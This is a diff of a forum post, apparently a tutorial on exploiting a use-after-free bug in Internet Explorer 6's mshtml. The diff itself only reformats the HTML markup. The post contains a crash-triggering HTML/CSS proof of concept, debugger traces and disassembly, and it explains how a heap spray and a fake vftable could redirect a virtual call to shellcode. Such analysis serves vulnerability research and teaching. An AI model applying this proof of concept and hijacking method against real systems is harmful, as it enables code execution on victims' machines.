 0040140D  |. E8 8EF20000    CALL &lt;JMP.&amp;msvcrt.system&gt;                              ; \system
 00401412  |. B8 00000000    MOV EAX,0
 00401417  |. C9             LEAVE
 00401418  \. C3             RETN</pre>
-</div>Lets put a break point on Call and analyze where EAX point to:<br />
-<br />
+</div>Lets put a break point on Call and analyze where EAX point to:<br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<pre class="bbcode_code"style="height:240px;">0:000&gt; t
+	<pre class="bbcode_code" style="height:240px;">0:000&gt; t
 eax=00410a5c ebx=00004000 ecx=0040cc50 edx=00441c84 esi=00def786 edi=00def6f2
 eip=004013e3 esp=0022ff10 ebp=0022ff78 iopl=0         nv up ei pl nz na pe nc
 cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
@@ -910,50 +905,50 @@ image00400000+0x10a5c:
 00410a71 e8a6b60200      call    image00400000+0x3c11c (0043c11c)
 00410a76 c7442404ecae4300 mov     dword ptr [esp+4],offset image00400000+0x3aeec (0043aeec)
 00410a7e 890424          mov     dword ptr [esp],eax</pre>
-</div>Now that we are clear how VFtable works the exploitation of Use-after free could be done a couple of ways.The basic way of doing it would be. <br />
-<ul><li style="">De allocate an object having a VFT entry</li><li style="">Controlling the Vftable and pointing it to out own [shellcode]code.</li><li style="">So now when a Virtual Function call takes place it point to our injected code.</li></ul><br />
-<b><u>Use After Free Exploitation [IE 6 0-day].<br />
-</u></b><br />
-<br />
+</div>Now that we are clear how VFtable works the exploitation of Use-after free could be done a couple of ways.The basic way of doing it would be. <br/>
+<ul><li style="">De allocate an object having a VFT entry</li><li style="">Controlling the Vftable and pointing it to out own [shellcode]code.</li><li style="">So now when a Virtual Function call takes place it point to our injected code.</li></ul><br/>
+<b><u>Use After Free Exploitation [IE 6 0-day].<br/>
+</u></b><br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">HTML Code:</div>
-	<pre class="bbcode_code" style="height:32*12px};"><span style="color:#000080">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTAL 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span>
-<span style="color:#000080">&lt;html xmlns=<span style="color:#0000FF">&quot;http://www.w3.org/1999/xhtml&quot;</span> &gt;</span>
+	<pre class="bbcode_code" style="height:32*12px};"><span style="color:#000080">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTAL 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;</span>
+<span style="color:#000080">&lt;html xmlns=<span style="color:#0000FF">"http://www.w3.org/1999/xhtml"</span> &gt;</span>
 <span style="color:#000080">&lt;head&gt;</span>
-<span style="color:#000080">&lt;meta http-equiv=&quot;Content-Type&quot; content=<span style="color:#0000FF">&quot;text/html; charset=utf-8&quot;</span>/&gt;</span>
-<span style="color:#000080">&lt;meta http-equiv=&quot;refresh&quot; content=<span style="color:#0000FF">&quot;1&quot;</span>&gt;</span>
+<span style="color:#000080">&lt;meta http-equiv="Content-Type" content=<span style="color:#0000FF">"text/html; charset=utf-8"</span>/&gt;</span>
+<span style="color:#000080">&lt;meta http-equiv="refresh" content=<span style="color:#0000FF">"1"</span>&gt;</span>
 <span style="color:#000080">&lt;title&gt;</span>FB1H2S Browser Test , soemthing weired here<span style="color:#000080">&lt;/title&gt;</span>
-<span style="color:#000080">&lt;link href=<span style="color:#0000FF">&quot;sass.css&quot;</span> rel=<span style="color:#0000FF">&quot;stylesheet&quot;</span> type=<span style="color:#0000FF">&quot;text/css&quot;</span>/&gt;</span>
+<span style="color:#000080">&lt;link href=<span style="color:#0000FF">"sass.css"</span> rel=<span style="color:#0000FF">"stylesheet"</span> type=<span style="color:#0000FF">"text/css"</span>/&gt;</span>
 
-<span style="color:#800000">&lt;script src=<span style="color:#0000FF">&quot;http://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js&quot;</span> type=<span style="color:#0000FF">&quot;text/javascript&quot;</span>&gt;</span><span style="color:#800000">&lt;/script&gt;</span>
+<span style="color:#800000">&lt;script src=<span style="color:#0000FF">"http://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"</span> type=<span style="color:#0000FF">"text/javascript"</span>&gt;</span><span style="color:#800000">&lt;/script&gt;</span>
 <span style="color:#800000">&lt;script&gt;</span>
 
-document.write(&quot;FB1H2S Use After Free test#213&quot;);
+document.write("FB1H2S Use After Free test#213");
 <span style="color:#800000">&lt;/script&gt;</span>
 
 <span style="color:#000080">&lt;/head&gt;</span>
 
 <span style="color:#000080">&lt;body&gt;</span>
 
-<span style="color:#000080">&lt;div style=<span style="color:#0000FF">&quot;float:left; width:770px; margin-left:8px;&quot;</span>&gt;</span>
+<span style="color:#000080">&lt;div style=<span style="color:#0000FF">"float:left; width:770px; margin-left:8px;"</span>&gt;</span>
 
-<span style="color:#000080">&lt;div class=<span style="color:#0000FF">&quot;fb1h2s_fb1h2s&quot;</span>&gt;</span>
+<span style="color:#000080">&lt;div class=<span style="color:#0000FF">"fb1h2s_fb1h2s"</span>&gt;</span>
 
 <span style="color:#000080">&lt;/div&gt;</span>
 <span style="color:#000080">&lt;span &gt;</span> <span style="color:#000080">&lt;/span&gt;</span>
 
-<span style="color:#000080">&lt;div class=<span style="color:#0000FF">&quot;fb1h2s_fb1h2s_fb1h2s&quot;</span>&gt;</span>
+<span style="color:#000080">&lt;div class=<span style="color:#0000FF">"fb1h2s_fb1h2s_fb1h2s"</span>&gt;</span>
 
-<span style="color:#000080">&lt;div class=<span style="color:#0000FF">&quot;fb1h2s_fb1h2s_fb1h4s&quot;</span> &gt;</span>
+<span style="color:#000080">&lt;div class=<span style="color:#0000FF">"fb1h2s_fb1h2s_fb1h4s"</span> &gt;</span>
 IE WTF
 <span style="color:#000080">&lt;/div&gt;</span>
 
 
 
-<span style="color:#000080">&lt;div class=<span style="color:#0000FF">&quot;aboutproduct&quot;</span>&gt;</span>FB1H2s : FB!H2S : THE Garage 4 Hackers : Bla Bla Bla<span style="color:#000080">&lt;/div&gt;</span>
+<span style="color:#000080">&lt;div class=<span style="color:#0000FF">"aboutproduct"</span>&gt;</span>FB1H2s : FB!H2S : THE Garage 4 Hackers : Bla Bla Bla<span style="color:#000080">&lt;/div&gt;</span>
 <span style="color:#000080">&lt;/div&gt;</span>
 
-<span style="color:#000080">&lt;div class=<span style="color:#0000FF">&quot;fb1h2s_fb1h2s_fb1h3s&quot;</span>&gt;</span>
+<span style="color:#000080">&lt;div class=<span style="color:#0000FF">"fb1h2s_fb1h2s_fb1h3s"</span>&gt;</span>
 
 <span style="color:#000080">&lt;/div&gt;</span>
 <span style="color:#000080">&lt;/div&gt;</span>
@@ -967,11 +962,11 @@ sass.css
 .fb1h2s_fb1h2s_fb1h3s{float:left;width:164px;margi  n-left:5px}
 .fb1h2s_fb1h2s_fb1h4s{width:551px;height:34px;back  ground-repeat:no-repeat;font-size:13px;font-weight:700;font-family:arial;margin-left:10px;float:left;padding:7px 0 0 10px}
 .aboutproduct{width:530px;height:auto;text-align:justify;line-height:18px;float:left;font-family:arial;color:#333;margin-bottom:10px;padding:0 5px 5px 13px}</pre>
-</div>The program crashes on IE 6 with the following exception.<br />
-<br />
+</div>The program crashes on IE 6 with the following exception.<br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<pre class="bbcode_code"style="height:120px;">(914.8fc): Access violation - code c0000005 (first chance)
+	<pre class="bbcode_code" style="height:120px;">(914.8fc): Access violation - code c0000005 (first chance)
 First chance exceptions are reported before any exception handling.
 This exception may be expected and handled.
 eax=04cb4740 ebx=00000000 ecx=04cb4740 edx=04b80bfc esi=04cd8b40 edi=00080000
@@ -979,12 +974,12 @@ eip=7d51f463 esp=0013e5a4 ebp=0013e5f0 iopl=0         nv up ei pl nz na po nc
 cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
 mshtml!CDispNode::GetRootNode+0x6:
 7d51f463 8b4808          mov     ecx,dword ptr [eax+8] ds:0023:04cb4748=????????</pre>
-</div><br />
-The Backtrace. <br />
-<br />
+</div><br/>
+The Backtrace. <br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<pre class="bbcode_code"style="height:288px;">0:000&gt; knL
+	<pre class="bbcode_code" style="height:288px;">0:000&gt; knL
  # ChildEBP RetAddr  
 00 0013b478 7d54f5c0 mshtml!CDispNode::GetDispRoot+0x12
 01 0013b4bc 7d55118b mshtml!CDispNode::ReplaceNode+0xdb
@@ -1006,22 +1001,22 @@ The Backtrace. <br />
 11 0013c21c 7d506529 mshtml!CDisplay::RecalcView+0x6b
 12 0013c2c4 7d689582 mshtml!CFlowLayout::CalcTextSize+0x2ee
 13 0013c4fc 7d5b170b mshtml!CFlowLayout::CalcSizeCoreCSS1Strict+0xe8d</pre>
-</div>Disassembly of the crashed function:<br />
-<br />
+</div>Disassembly of the crashed function:<br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<pre class="bbcode_code"style="height:108px;">mshtml!CDispNode::GetRootNode+0x6:
+	<pre class="bbcode_code" style="height:108px;">mshtml!CDispNode::GetRootNode+0x6:
 7d51f463 8b4808          mov     ecx,dword ptr [eax+8]
 7d51f466 85c9            test    ecx,ecx
 7d51f468 7404            je      mshtml!CDispNode::GetRootNode+0xd (7d51f46e)
 7d51f46a 8bc1            mov     eax,ecx
 7d51f46c ebf5            jmp     mshtml!CDispNode::GetRootNode+0x6 (7d51f463)
 7d51f46e c3              ret</pre>
-</div>The entire code flow is as follows.<br />
-<br />
+</div>The entire code flow is as follows.<br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<pre class="bbcode_code"style="height:360px;">mshtml!CDispNode::GetDispRoot:
+	<pre class="bbcode_code" style="height:360px;">mshtml!CDispNode::GetDispRoot:
 7d51f437 8bff            mov     edi,edi
 7d51f439 56              push    esi
 7d51f43a e822000000      call    mshtml!CDispNode::GetRootNode (7d51f461)
@@ -1049,48 +1044,49 @@ mshtml!CDispNode::GetRootNode:
 7d51f46a 8bc1            mov     eax,ecx
 7d51f46c ebf5            jmp     mshtml!CDispNode::GetRootNode+0x6 (7d51f463)
 7d51f46e c3              ret</pre>
-</div><u>The C equivalent code:<br />
-</u><br />
-<br />
+</div><u>The C equivalent code:<br/>
+</u><br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">PHP Code:</div>
-	<div class="bbcode_code"style="height:372px;"><code><code><span style="color: #000000">
-<span style="color: #0000BB">int&nbsp;__thiscall&nbsp;CElement__GetParentAncestorSafe</span><span style="color: #007700">(</span><span style="color: #0000BB">int&nbsp;this</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">int&nbsp;a2</span><span style="color: #007700">)<br />{<br />&nbsp;&nbsp;</span><span style="color: #0000BB">int&nbsp;result</span><span style="color: #007700">;&nbsp;</span><span style="color: #FF8000">//&nbsp;eax@1<br />&nbsp;&nbsp;</span><span style="color: #0000BB">int&nbsp;v3</span><span style="color: #007700">;&nbsp;</span><span style="color: #FF8000">//&nbsp;ecx@1<br />&nbsp;&nbsp;</span><span style="color: #0000BB">int&nbsp;v4</span><span style="color: #007700">;&nbsp;</span><span style="color: #FF8000">//&nbsp;ecx@2<br /><br />&nbsp;&nbsp;</span><span style="color: #0000BB">v3&nbsp;</span><span style="color: #007700">=&nbsp;*(</span><span style="color: #0000BB">_DWORD&nbsp;</span><span style="color: #007700">*)(</span><span style="color: #0000BB">this&nbsp;</span><span style="color: #007700">+&nbsp;</span><span style="color: #0000BB">16</span><span style="color: #007700">);<br />&nbsp;&nbsp;</span><span style="color: #0000BB">result&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0</span><span style="color: #007700">;<br />&nbsp;&nbsp;if&nbsp;(&nbsp;</span><span style="color: #0000BB">v3&nbsp;</span><span style="color: #007700">)<br />&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">v4&nbsp;</span><span style="color: #007700">=&nbsp;*(</span><span style="color: #0000BB">_DWORD&nbsp;</span><span style="color: #007700">*)(</span><span style="color: #0000BB">v3&nbsp;</span><span style="color: #007700">+&nbsp;</span><span style="color: #0000BB">4</span><span style="color: #007700">);<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;</span><span style="color: #0000BB">v4&nbsp;</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;do<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;*(</span><span style="color: #0000BB">_BYTE&nbsp;</span><span style="color: #007700">*)(</span><span style="color: #0000BB">v4&nbsp;</span><span style="color: #007700">+&nbsp;</span><span style="color: #0000BB">8</span><span style="color: #007700">)&nbsp;==&nbsp;</span><span style="color: #0000BB">a2&nbsp;</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">v4&nbsp;</span><span style="color: #007700">=&nbsp;*(</span><span style="color: #0000BB">_DWORD&nbsp;</span><span style="color: #007700">*)(</span><span style="color: #0000BB">v4&nbsp;</span><span style="color: #007700">+&nbsp;</span><span style="color: #0000BB">4</span><span style="color: #007700">);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;(&nbsp;</span><span style="color: #0000BB">v4&nbsp;</span><span style="color: #007700">);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;</span><span style="color: #0000BB">v4&nbsp;</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">result&nbsp;</span><span style="color: #007700">=&nbsp;*(</span><span style="color: #0000BB">_DWORD&nbsp;</span><span style="color: #007700">*)</span><span style="color: #0000BB">v4</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;}<br />&nbsp;&nbsp;return&nbsp;</span><span style="color: #0000BB">result</span><span style="color: #007700">;<br />}<br /><br />/(</span><span style="color: #0000BB">7D51F437</span><span style="color: #007700">)<br /></span><span style="color: #0000BB">void&nbsp;</span><span style="color: #007700">*</span><span style="color: #0000BB">__thiscall&nbsp;CDispNode__GetDispRoot</span><span style="color: #007700">(</span><span style="color: #0000BB">void&nbsp;</span><span style="color: #007700">*</span><span style="color: #0000BB">this</span><span style="color: #007700">)<br />{<br />&nbsp;&nbsp;</span><span style="color: #0000BB">void&nbsp;</span><span style="color: #007700">*</span><span style="color: #0000BB">v1</span><span style="color: #007700">;&nbsp;</span><span style="color: #FF8000">//&nbsp;eax@1<br />&nbsp;&nbsp;</span><span style="color: #0000BB">void&nbsp;</span><span style="color: #007700">*</span><span style="color: #0000BB">v2</span><span style="color: #007700">;&nbsp;</span><span style="color: #FF8000">//&nbsp;esi@1<br />&nbsp;&nbsp;</span><span style="color: #0000BB">void&nbsp;</span><span style="color: #007700">*</span><span style="color: #0000BB">result</span><span style="color: #007700">;&nbsp;</span><span style="color: #FF8000">//&nbsp;eax@3<br /><br />&nbsp;&nbsp;</span><span style="color: #0000BB">v1&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">CDispNode__GetRootNode</span><span style="color: #007700">(</span><span style="color: #0000BB">this</span><span style="color: #007700">);<br />&nbsp;&nbsp;</span><span style="color: #0000BB">v2&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">v1</span><span style="color: #007700">;<br />&nbsp;&nbsp;if&nbsp;(&nbsp;</span><span style="color: #0000BB">v1&nbsp;</span><span style="color: #007700">&amp;&amp;&nbsp;(*(</span><span style="color: #0000BB">int&nbsp;</span><span style="color: #007700">(</span><span style="color: #0000BB">__thiscall&nbsp;</span><span style="color: #007700">**)(</span><span style="color: #0000BB">_DWORD</span><span style="color: #007700">))(*(</span><span style="color: #0000BB">_DWORD&nbsp;</span><span style="color: #007700">*)</span><span style="color: #0000BB">v1&nbsp;</span><span style="color: #007700">+&nbsp;</span><span style="color: #0000BB">52</span><span style="color: #007700">))(</span><span style="color: #0000BB">v1</span><span style="color: #007700">)&nbsp;)<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">result&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">v2</span><span style="color: #007700">;<br />&nbsp;&nbsp;else<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">result&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0</span><span style="color: #007700">;<br />&nbsp;&nbsp;return&nbsp;</span><span style="color: #0000BB">result</span><span style="color: #007700">;<br />}&nbsp;<br /></span><span style="color: #0000BB"></span>
+	<div class="bbcode_code" style="height:372px;"><code><code><span style="color: #000000">
+<span style="color: #0000BB">int __thiscall CElement__GetParentAncestorSafe</span><span style="color: #007700">(</span><span style="color: #0000BB">int this</span><span style="color: #007700">, </span><span style="color: #0000BB">int a2</span><span style="color: #007700">)<br/>{<br/>  </span><span style="color: #0000BB">int result</span><span style="color: #007700">; </span><span style="color: #FF8000">// eax@1<br/>  </span><span style="color: #0000BB">int v3</span><span style="color: #007700">; </span><span style="color: #FF8000">// ecx@1<br/>  </span><span style="color: #0000BB">int v4</span><span style="color: #007700">; </span><span style="color: #FF8000">// ecx@2<br/><br/>  </span><span style="color: #0000BB">v3 </span><span style="color: #007700">= *(</span><span style="color: #0000BB">_DWORD </span><span style="color: #007700">*)(</span><span style="color: #0000BB">this </span><span style="color: #007700">+ </span><span style="color: #0000BB">16</span><span style="color: #007700">);<br/>  </span><span style="color: #0000BB">result </span><span style="color: #007700">= </span><span style="color: #0000BB">0</span><span style="color: #007700">;<br/>  if ( </span><span style="color: #0000BB">v3 </span><span style="color: #007700">)<br/>  {<br/>    </span><span style="color: #0000BB">v4 </span><span style="color: #007700">= *(</span><span style="color: #0000BB">_DWORD </span><span style="color: #007700">*)(</span><span style="color: #0000BB">v3 </span><span style="color: #007700">+ </span><span style="color: #0000BB">4</span><span style="color: #007700">);<br/>    if ( </span><span style="color: #0000BB">v4 </span><span style="color: #007700">)<br/>    {<br/>      do<br/>      {<br/>        if ( *(</span><span style="color: #0000BB">_BYTE </span><span style="color: #007700">*)(</span><span style="color: #0000BB">v4 </span><span style="color: #007700">+ </span><span style="color: #0000BB">8</span><span style="color: #007700">) == </span><span style="color: #0000BB">a2 </span><span style="color: #007700">)<br/>          break;<br/>        </span><span style="color: #0000BB">v4 </span><span style="color: #007700">= *(</span><span style="color: #0000BB">_DWORD </span><span style="color: #007700">*)(</span><span style="color: #0000BB">v4 </span><span style="color: #007700">+ </span><span style="color: #0000BB">4</span><span style="color: #007700">);<br/>      }<br/>      while ( </span><span style="color: #0000BB">v4 </span><span style="color: #007700">);<br/>      if ( </span><span style="color: #0000BB">v4 </span><span style="color: #007700">)<br/>        </span><span style="color: #0000BB">result </span><span style="color: #007700">= *(</span><span style="color: #0000BB">_DWORD </span><span style="color: #007700">*)</span><span style="color: #0000BB">v4</span><span style="color: #007700">;<br/>    }<br/>  }<br/>  return </span><span style="color: #0000BB">result</span><span style="color: #007700">;<br/>}<br/><br/>/(</span><span style="color: #0000BB">7D51F437</span><span style="color: #007700">)<br/></span><span style="color: #0000BB">void </span><span style="color: #007700">*</span><span style="color: #0000BB">__thiscall CDispNode__GetDispRoot</span><span style="color: #007700">(</span><span style="color: #0000BB">void </span><span style="color: #007700">*</span><span style="color: #0000BB">this</span><span style="color: #007700">)<br/>{<br/>  </span><span style="color: #0000BB">void </span><span style="color: #007700">*</span><span style="color: #0000BB">v1</span><span style="color: #007700">; </span><span style="color: #FF8000">// eax@1<br/>  </span><span style="color: #0000BB">void </span><span style="color: #007700">*</span><span style="color: #0000BB">v2</span><span style="color: #007700">; </span><span style="color: #FF8000">// esi@1<br/>  </span><span style="color: #0000BB">void </span><span style="color: #007700">*</span><span style="color: #0000BB">result</span><span style="color: #007700">; </span><span style="color: #FF8000">// eax@3<br/><br/>  </span><span style="color: #0000BB">v1 </span><span style="color: #007700">= </span><span style="color: #0000BB">CDispNode__GetRootNode</span><span style="color: #007700">(</span><span style="color: #0000BB">this</span><span style="color: #007700">);<br/>  </span><span style="color: #0000BB">v2 </span><span style="color: #007700">= </span><span style="color: #0000BB">v1</span><span style="color: #007700">;<br/>  if ( </span><span style="color: #0000BB">v1 </span><span style="color: #007700">&amp;&amp; (*(</span><span style="color: #0000BB">int </span><span style="color: #007700">(</span><span style="color: #0000BB">__thiscall </span><span style="color: #007700">**)(</span><span style="color: #0000BB">_DWORD</span><span style="color: #007700">))(*(</span><span style="color: #0000BB">_DWORD </span><span style="color: #007700">*)</span><span style="color: #0000BB">v1 </span><span style="color: #007700">+ </span><span style="color: #0000BB">52</span><span style="color: #007700">))(</span><span style="color: #0000BB">v1</span><span style="color: #007700">) )<br/>    </span><span style="color: #0000BB">result </span><span style="color: #007700">= </span><span style="color: #0000BB">v2</span><span style="color: #007700">;<br/>  else<br/>    </span><span style="color: #0000BB">result </span><span style="color: #007700">= </span><span style="color: #0000BB">0</span><span style="color: #007700">;<br/>  return </span><span style="color: #0000BB">result</span><span style="color: #007700">;<br/>} 
+<br/></span><span style="color: #0000BB"></span>
 </span>
 </code></code></div>
-</div><br />
-The program crashes due to a use after free issue.<br />
-<br />
+</div><br/>
+The program crashes due to a use after free issue.<br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<pre class="bbcode_code"style="height:48px;">&gt;u 7d51f463 
+	<pre class="bbcode_code" style="height:48px;">&gt;u 7d51f463 
 7d51f463 8b4808          mov     ecx,dword ptr [eax+8]</pre>
-</div>Here EAX is pointer to an Object element and ECX to the vftable. Here the object pointed to by the Vftable is freed, and there by the memory location pointed by EAX.<br />
-<br />
-<br />
-<br />
+</div>Here EAX is pointer to an Object element and ECX to the vftable. Here the object pointed to by the Vftable is freed, and there by the memory location pointed by EAX.<br/>
+<br/>
+<br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<pre class="bbcode_code"style="height:84px;">0:000&gt; d 04cb4748
+	<pre class="bbcode_code" style="height:84px;">0:000&gt; d 04cb4748
 04cb4748  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
 04cb4758  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
 04cb4768  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
 04cb4778  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??    ????????????????</pre>
-</div><br />
-If you look at the next instructions , we notice the following .<br />
-<br />
+</div><br/>
+If you look at the next instructions , we notice the following .<br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<pre class="bbcode_code"style="height:84px;">7d51f466 85c9            test    ecx,ecx 
+	<pre class="bbcode_code" style="height:84px;">7d51f466 85c9            test    ecx,ecx 
 7d51f468 7404            je      mshtml!CDispNode::GetRootNode+0xd (7d51f46e)
 7d51f46a 8bc1            mov     eax,ecx
 7d51f46c ebf5            jmp     mshtml!CDispNode::GetRootNode+0x6 (7d51f463)
 7d51f46e c3              ret</pre>
-</div>The Pesudo Code:<br />
-<br />
+</div>The Pesudo Code:<br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<pre class="bbcode_code"style="height:348px;">ecx = dword ptr[ eax+8 ] 
+	<pre class="bbcode_code" style="height:348px;">ecx = dword ptr[ eax+8 ] 
  
 if (ecx ==0):
           
@@ -1117,18 +1113,18 @@ if (ecx ==0):
  call    dword ptr [eax+34h] <font color="#800000">&lt;-- call adress pointed by eax+34h</font>
 
 }</pre>
-</div>So if we can make  { mov     ecx,dword ptr [eax+8]  }point to the heap such a way that EAX+8 contains [00000000] and EAX contains a adress we control , we would have code execution. We can initialize this area using heap spray. <br />
-<br />
-What I did was arranged my HTML tags such a way that it would leave a lot of garbage values mainly null in the EAX pointed memory, and then the program would crash at the call instruction. This is never the right way of doing nor reliable, but it was working fine for me. <br />
-<br />
-No we could take control of the program here.           <br />
-<br />
+</div>So if we can make  { mov     ecx,dword ptr [eax+8]  }point to the heap such a way that EAX+8 contains [00000000] and EAX contains a adress we control , we would have code execution. We can initialize this area using heap spray. <br/>
+<br/>
+What I did was arranged my HTML tags such a way that it would leave a lot of garbage values mainly null in the EAX pointed memory, and then the program would crash at the call instruction. This is never the right way of doing nor reliable, but it was working fine for me. <br/>
+<br/>
+No we could take control of the program here.           <br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<pre class="bbcode_code"style="height:36px;">7d51f44d ff5034          call    dword ptr [eax+34h]</pre>
+	<pre class="bbcode_code" style="height:36px;">7d51f44d ff5034          call    dword ptr [eax+34h]</pre>
 </div><div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<pre class="bbcode_code"style="height:144px;">(36c.440): Access violation - code c0000005 (first chance)
+	<pre class="bbcode_code" style="height:144px;">(36c.440): Access violation - code c0000005 (first chance)
 First chance exceptions are reported before any exception handling.
 This exception may be expected and handled.
 eax=00000000 ebx=01c53380 ecx=01c3e6e0 edx=000000a4 esi=01c3e6e0 edi=01c071f4
@@ -1140,7 +1136,7 @@ Missing image name, possible paged-out or corrupt data.
 Missing image name, possible paged-out or corrupt data.</pre>
 </div><div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<pre class="bbcode_code"style="height:168px;">mshtml!CDispNode::GetDispRoot:
+	<pre class="bbcode_code" style="height:168px;">mshtml!CDispNode::GetDispRoot:
 7d51f437 8bff            mov     edi,edi
 7d51f439 56              push    esi
 7d51f43a e822000000      call    mshtml!CDispNode::GetRootNode (7d51f461)
@@ -1152,117 +1148,117 @@ Missing image name, possible paged-out or corrupt data.</pre>
 7d51f44d ff5034          call    dword ptr [eax+34h]  ds:0023:00000034=????????
 7d51f450 85c0            test    eax,eax
 7d51f452 0f84b2020000    je      mshtml!CDispNode::GetDispRoot+0x1d (7d51f70a)</pre>
-</div><font color="#800000">7d51f449 8b06            mov     eax,dword ptr [esi]<br />
-</font><br />
-Move DWORD (a 32-bit/4-byte value) in memory location specified by ESI[01c3e6e0]--&gt;&quot;00000000&quot; into register EAX, so EAX becomes [00000000]<br />
-<br />
-<font color="#800000">7d51f44d ff5034          call    dword ptr [eax+34h]  <br />
-<br />
-</font>The crash is at a virtual Call with [Register + offset ] . The Vftable is in eax + offset[34h] the adress of function to be executed . In this case it would be 13th entry in the table. Now that it's pointing to [00000000] the program crashes. <br />
-<br />
-We can take control of the program  here and have code execution, for that we need to find the type of object that was freed and the no of bytes that was allocated . Knowing these details we would be able to build fake objects of that size using JS . So that a the call at 7d51f463 [eax+8]  would land on our crafted Vftable object and return [00000000] and <br />
-<br />
+</div><font color="#800000">7d51f449 8b06            mov     eax,dword ptr [esi]<br/>
+</font><br/>
+Move DWORD (a 32-bit/4-byte value) in memory location specified by ESI[01c3e6e0]--&gt;"00000000" into register EAX, so EAX becomes [00000000]<br/>
+<br/>
+<font color="#800000">7d51f44d ff5034          call    dword ptr [eax+34h]  <br/>
+<br/>
+</font>The crash is at a virtual Call with [Register + offset ] . The Vftable is in eax + offset[34h] the adress of function to be executed . In this case it would be 13th entry in the table. Now that it's pointing to [00000000] the program crashes. <br/>
+<br/>
+We can take control of the program  here and have code execution, for that we need to find the type of object that was freed and the no of bytes that was allocated . Knowing these details we would be able to build fake objects of that size using JS . So that a the call at 7d51f463 [eax+8]  would land on our crafted Vftable object and return [00000000] and <br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<pre class="bbcode_code"style="height:36px;"><font color="#800000">7d51f463 8b4808          mov     ecx,dword ptr [eax+8]</font></pre>
-</div> a call to <br />
-<br />
+	<pre class="bbcode_code" style="height:36px;"><font color="#800000">7d51f463 8b4808          mov     ecx,dword ptr [eax+8]</font></pre>
+</div> a call to <br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<pre class="bbcode_code"style="height:36px;"><font color="#800000">7d51f44d ff5034 call dword ptr [eax+34h]</font></pre>
-</div>Vftable+34h would make the program land on our shellcode.  <br />
-<br />
-There are <a href="../projects.wox-xion.ch/epfl/cmu2011/19-601/paper1.pdf" target="_blank">couple</a> of ways to exploit this a good reference would be <a href="../www.blackhat.com/presentations/bh-usa-07/Afek/Whitepaper/bh-usa-07-afek-WP.pdf" target="_blank">this</a>.<br />
-<br />
-<u><b>1) The double reference exploit</b></u><br />
-<br />
-<br />
-<u>Requirements:</u> <br />
-<br />
-A controllable VFTable pointer.<br />
-<br />
-<u>Method:</u><br />
-<br />
-Our own code is placed in the deallocated object or some where in the memory where we could point to via Vftable.<br />
-<br />
-Then we replace the VFTable pointer by one which points to some memory<br />
-later we will use this as VFTable pointing back to where we put our code.<br />
-<br />
